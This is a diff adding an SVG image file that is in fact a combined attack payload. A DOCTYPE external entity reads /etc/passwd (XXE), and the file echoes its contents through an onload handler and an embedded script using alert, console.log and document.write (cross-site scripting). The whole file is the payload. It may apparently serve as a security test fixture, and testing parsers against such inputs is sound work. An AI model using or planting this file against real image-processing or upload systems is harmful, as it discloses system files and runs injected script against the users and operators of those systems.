@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY passwd SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="800px" height="800px" onload="alert('&passwd;')">
+  <script>
+    <![CDATA[
+      alert("&passwd;");
+      console.log("&passwd;");
+      document.write("&passwd;");
+    ]]>
+  </script>
+  <text x="10" y="20">Check console</text>
+</svg>
